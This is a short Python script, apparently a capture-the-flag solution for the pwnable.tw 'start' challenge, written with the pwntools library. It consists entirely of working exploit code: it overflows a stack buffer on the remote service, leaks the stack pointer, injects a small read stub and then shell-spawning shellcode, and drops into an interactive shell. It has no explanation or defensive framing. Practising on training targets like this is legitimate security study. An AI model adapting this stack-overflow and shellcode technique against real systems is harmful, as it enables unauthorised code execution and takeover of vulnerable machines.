from pwn import *
context(arch = "i386", os = "linux")
#p = process("./start")
p = remote("chall.pwnable.tw","10000")
p.recvuntil(":")
p.send("A"*20+p32(0x8048087))
s = p.recv(4)
address_esp = u32(s)
ass='''mov al,0x03\n
	   sub esp,0x40\n
	   mov ecx,esp\n
	   mov dl,0x40\n
	   int 0x80\n
	   jmp esp'''
p.send("A"*0x14+p32(address_esp+0x14)+asm(ass))
sleep(3)
p.send(asm(shellcraft.sh()))
p.interactive()